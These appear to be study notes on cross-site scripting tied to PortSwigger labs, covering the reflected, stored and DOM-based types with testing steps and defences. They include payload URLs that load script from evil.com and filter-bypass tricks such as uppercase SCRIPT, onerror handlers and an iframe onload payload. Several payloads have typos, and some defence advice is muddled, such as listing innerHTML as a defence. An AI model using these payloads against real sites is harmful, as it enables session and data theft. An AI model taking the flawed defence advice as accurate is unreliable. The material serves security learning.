# 11.B Cross Site Scripting with PortSwigger NEW

A vulnerable web application allows an attacker to send malicious code to a victim. This can result in cookie theft, stolen passwords, and exposure of sensitive data.

The attacker tricks the web application into returning malicious code to the victim’s browser.

## JavaScript

JavaScript is the front-end language that handles the action parts.

## How does it work?

A vulnerable web application is tricked by the attacker into returning malicious code to the user. Then the user executes the malicious code, which can result in cookie theft, sensitive data exposure, or a compromised system.

## Types of XSS

* **Reflected XSS**: the malicious code comes from the current HTTP request.
* **Stored XSS**: the malicious code comes from the database.
* **DOM-Based XSS**: the vulnerability is in client-side code.

## Reflected XSS

Allows malicious code to be executed through web application input parameters, such as a search bar. The web application executes the malicious code in the browser response.

### What is reflected XSS?

* When the application has an input parameter where the user request is reflected in the response.
  * Like: `https://amazon.in/shopping/laptop=?hp`
* Where the `hp` is reflected in the response.
* If the web application is vulnerable, the attacker can trick the application or add malicious code.
  * Like: `https://amazon.in/shopping/laptop=?hp%3cscirpt%3ehttps://evil.com/badcode.js%3c/scirpt`

### Impact of Reflected XSS

* Breaks the CIA.
* Sensitive data can be stolen (PII, password).

This can lead to the user’s cookie or sensitive data being stolen.

The malicious code is not stored or executed on the server; it is returned in the response and executed by the browser.

The browser should validate and sanitize the input data.

Reflected XSS targets random users and exploits the trust of the web application.

### Blackbox Reflected XSS

* Check for reflected response from the web application.
  * If it is reflected, then check for any defense coding.
* Use `Ctrl + F` and check the reflected area in the source code.
* If it is in HTML tags, try to break out using closing tags and syntax like `>`, `"`, `'`, `</\>` etc.
* Execute some JavaScript functions like `alert` or `print` (mostly `alert` is blocked by the browser).
* The word `script` may be replaced with a space as input sanitization, which can be bypassed by using uppercase `SCRIPT`.
* Closing tags and double quotes, which help in closing HTML tags, can be replaced with a space. This can be bypassed by using `<img src>` and `<svg>` tags with JavaScript functions like `onclick`, `onerror`, and `onload`.
* Angle brackets HTML encoding can break the code to view the quote, then use `-` (hyphen) with a JavaScript function like `[Hexruinx '-alert(1)-']`.
* Angle brackets HTML double encoding can break the code to view the quote. If user input is output in single quotes, and the backslash is output in double backslashes, use that to reflect JS `\'- alert()//`.

### Defences against Reflected XSS

* User validation and input sanitization is applied.
* CSP and other defence mechanisms should be applied.
* Create a function which sanitizes the code.
* Remove the `<script>` tags or replace the `<script>` tags with URL encoding space `%020`.
* Remove the opening, closing, brackets, and backslash or replace the opening/closing bracket `<\>` and backslash with URL encoding space `0%20`.
* AngularJS, `innerhtml`

## Stored XSS

The client browser sends malicious code to the server, which is executed on the server and returned in the browser.

A vulnerable web application with features like comments or posts can be used by an attacker to store malicious code. When the user clicks the attacker’s post, the user’s system can be compromised.

### What is Stored XSS?

* When the application has a store feature like comment or post.
  * Like: `https://threads.com/comments=?normal+user+writing+comment`
* If the web application is vulnerable to stored XSS, the attacker can trick the application or add malicious code.
  * Like: `https://threads.com/comments=?normal+user+writing+comment%3cscript%3ehttps://evil.com%3c/scirpt`
* After the malicious code is stored in the web application and the user clicks it, this can result in cookie theft or sensitive data theft.

### Impact of Stored XSS

* Breaks the CIA.
* Sensitive data can be stolen (PII, password).

### Blackbox Stored XSS

* Check the request and response for any defense headers.
* Fill all input parameters and check the response in the source code.
* Check how the parameter is stored.
* Use `Ctrl + F` and check the source code for the input parameters.
* If it is in HTML tags, try to break out using closing tags and syntax like `>`, `"`, `'`, `</\>` etc.
* Execute some JavaScript functions like `alert` or `print` (mostly `alert` is blocked by the browser).
* The word `script` may be replaced with a space as input sanitization, which can be bypassed by using uppercase `SCRIPT`.
* Closing tags and double quotes, which help in closing HTML tags, can be replaced with a space. This can be bypassed by using `<img src>` and `<svg>` tags with JavaScript functions like `onclick`, `onerror`, and `onload`.

### Defence against Stored XSS

* User validation and input sanitization is applied.
* CSP and other defence mechanisms should be applied.

## DOM Based XSS

Document Object Model is the structure of the webpage source code.

An attacker inputs malicious code into the web application that the browser loads, which exploits the client browser.

Example:

A web application allows changing the theme, where the attacker inputs malicious code that is sent to the client and loaded by the client browser, resulting in a compromised system or stolen cookie.

### What is DOM?

* Many websites have user input parameters that the attacker can trick into malicious code, which exploits the client browser and results in cookie theft and more.
* There is a submit feature which uses JavaScript to submit the form.
  * Like: `https://createprofile.com/lang=english`
* If the web application is vulnerable to DOM XSS, the attacker can use the `lang` JavaScript function or parameter and turn it into malicious code.
  * Like: `https://createprofile.com/lang=alert(1)` to `https://createprofile.com/lang=english%3cscript%3ealert(1)%3c/script`

### Blackbox DOM XSS

* Check the request and response for any defense headers.
* Fill all input parameters and check the response in the source code.
* Break the HTML using closing tags or `img` tags inside JavaScript tags and JavaScript functions.
* Check where the script is and where the HTML tags are called in the JavaScript.
* Get out of HTML tags using `<img>` or `<svg>` with the `onerror` JavaScript function, which results in a load error in the browser and triggers `onerror`.
* If using an `iframe`, get out of HTML tags like: `<iframe src="https://website/#" onload=" this.src +='< img src =x onerror =print()>'"></iframe>`

### Defence against DOM-Based XSS

* AnjularJS
* Innerhtml
